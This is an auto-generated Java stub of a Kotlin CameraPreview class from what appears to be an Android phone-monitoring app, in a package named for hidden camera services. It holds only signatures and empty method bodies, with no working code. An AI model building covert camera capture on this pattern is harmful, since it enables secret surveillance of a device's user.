package com.github.midros.istheapp.utils.hiddenCameraServiceUtils;

import java.lang.System;

/**
 * Created by luis rafael on 20/03/18.
 */
@android.annotation.SuppressLint(value = {"ViewConstructor"})
@kotlin.Metadata(mv = {1, 1, 15}, bv = {1, 0, 3}, k = 1, d1 = {"\u0000F\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000b\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0002\b\u0003\n\u0002\u0010\b\n\u0002\b\u000e\b\u0001\u0018\u00002\u00020\u00012\u00020\u0002B\u0015\u0012\u0006\u0010\u0003\u001a\u00020\u0004\u0012\u0006\u0010\u0005\u001a\u00020\u0006\u00a2\u0006\u0002\u0010\u0007J\b\u0010\u0012\u001a\u00020\u0013H\u0002J0\u0010\u0014\u001a\u00020\u00132\u0006\u0010\u0015\u001a\u00020\r2\u0006\u0010\u0016\u001a\u00020\u00172\u0006\u0010\u0018\u001a\u00020\u00172\u0006\u0010\u0019\u001a\u00020\u00172\u0006\u0010\u001a\u001a\u00020\u0017H\u0014J\u0010\u0010\u001b\u001a\u00020\r2\u0006\u0010\u001c\u001a\u00020\u0017H\u0002J\u000e\u0010\u001d\u001a\u00020\u00132\u0006\u0010\n\u001a\u00020\u000bJ\u0006\u0010\u001e\u001a\u00020\u0013J(\u0010\u001f\u001a\u00020\u00132\u0006\u0010 \u001a\u00020\u00112\u0006\u0010\u0016\u001a\u00020\u00172\u0006\u0010\u0018\u001a\u00020\u00172\u0006\u0010\u0019\u001a\u00020\u0017H\u0016J\u0010\u0010!\u001a\u00020\u00132\u0006\u0010 \u001a\u00020\u0011H\u0016J\u0010\u0010\"\u001a\u00020\u00132\u0006\u0010#\u001a\u00020\u0011H\u0016J\u0006\u0010$\u001a\u00020\u0013R\u0010\u0010\b\u001a\u0004\u0018\u00010\tX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u0010\u0010\n\u001a\u0004\u0018\u00010\u000bX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u001e\u0010\u000e\u001a\u00020\r2\u0006\u0010\f\u001a\u00020\r@BX\u0086\u000e\u00a2\u0006\b\n\u0000\u001a\u0004\b\u000e\u0010\u000fR\u000e\u0010\u0005\u001a\u00020\u0006X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u0010\u0010\u0010\u001a\u0004\u0018\u00010\u0011X\u0082\u000e\u00a2\u0006\u0002\n\u0000\u00a8\u0006%"}, d2 = {"Lcom/github/midros/istheapp/utils/hiddenCameraServiceUtils/CameraPreview;", "Landroid/view/SurfaceView;", "Landroid/view/SurfaceHolder$Callback;", "context", "Landroid/content/Context;", "mCameraCallbacks", "Lcom/github/midros/istheapp/utils/hiddenCameraServiceUtils/CameraCallbacks;", "(Landroid/content/Context;Lcom/github/midros/istheapp/utils/hiddenCameraServiceUtils/CameraCallbacks;)V", "camera", "Landroid/hardware/Camera;", "cameraConfig", "Lcom/github/midros/istheapp/utils/hiddenCameraServiceUtils/CameraConfig;", "<set-?>", "", "isSafeToTakePictureInternal", "()Z", "mHolder", "Landroid/view/SurfaceHolder;", "initSurfaceView", "", "onLayout", "b", "i", "", "i1", "i2", "i3", "safeCameraOpen", "id", "startCameraInternal", "stopPreviewAndFreeCamera", "surfaceChanged", "surfaceHolder", "surfaceCreated", "surfaceDestroyed", "holder", "takePictureInternal", "app_debug"})
public final class CameraPreview extends android.view.SurfaceView implements android.view.SurfaceHolder.Callback {
    private android.view.SurfaceHolder mHolder;
    private android.hardware.Camera camera;
    private com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraConfig cameraConfig;
    private volatile boolean isSafeToTakePictureInternal;
    private final com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraCallbacks mCameraCallbacks = null;
    private java.util.HashMap _$_findViewCache;
    
    public final boolean isSafeToTakePictureInternal() {
        return false;
    }
    
    private final void initSurfaceView() {
    }
    
    @java.lang.Override()
    protected void onLayout(boolean b, int i, int i1, int i2, int i3) {
    }
    
    @java.lang.Override()
    public void surfaceCreated(@org.jetbrains.annotations.NotNull()
    android.view.SurfaceHolder surfaceHolder) {
    }
    
    @java.lang.Override()
    public void surfaceChanged(@org.jetbrains.annotations.NotNull()
    android.view.SurfaceHolder surfaceHolder, int i, int i1, int i2) {
    }
    
    @java.lang.Override()
    public void surfaceDestroyed(@org.jetbrains.annotations.NotNull()
    android.view.SurfaceHolder holder) {
    }
    
    public final void startCameraInternal(@org.jetbrains.annotations.NotNull()
    com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraConfig cameraConfig) {
    }
    
    private final boolean safeCameraOpen(int id) {
        return false;
    }
    
    public final void takePictureInternal() {
    }
    
    public final void stopPreviewAndFreeCamera() {
    }
    
    public CameraPreview(@org.jetbrains.annotations.NotNull()
    android.content.Context context, @org.jetbrains.annotations.NotNull()
    com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraCallbacks mCameraCallbacks) {
        super(null);
    }
}